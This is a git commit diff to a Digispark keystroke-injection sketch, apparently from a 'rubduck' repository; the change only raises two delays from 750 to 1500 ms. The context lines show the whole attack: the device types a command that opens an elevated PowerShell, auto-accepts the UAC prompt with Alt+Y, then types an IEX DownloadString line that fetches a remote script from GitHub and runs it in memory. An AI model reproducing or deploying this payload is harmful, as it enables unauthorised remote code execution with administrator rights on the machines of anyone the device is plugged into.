58f5f9077179e8df6e313cfac0f65d6ac1770dee
luigit12 <58264257+Luigit12@users.noreply.github.com>
2021-01-19 14:00:55 +0100

    Update execscheduler.ino

--- execscheduler/execscheduler.ino
+++ execscheduler/execscheduler.ino
@@ -9,14 +9,14 @@ void loop() {
   
   DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(1500);
   
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(750);
   
   DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Luigit12/rubduck/master/scheduler.ps1');");
   DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(1500);
   
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
